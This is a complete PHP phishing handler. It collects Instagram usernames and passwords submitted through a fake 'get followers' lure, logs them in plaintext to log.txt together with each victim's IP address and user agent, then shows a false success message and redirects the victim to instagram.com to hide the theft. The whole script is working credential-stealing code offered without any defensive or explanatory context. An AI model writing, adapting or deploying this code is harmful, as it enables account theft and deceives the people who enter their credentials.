<?php
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$time = date("Y-m-d H:i:s");

file_put_contents("log.txt", "[$time] Username: $username | Password: $password | IP: $ip | UA: $ua\n", FILE_APPEND);

// Simulate "processing" page before redirecting
echo "<script>
  alert('Account connected successfully! You will receive followers within 24 hours.');
  window.location.href = 'https://instagram.com';
</script>";
exit();
?>
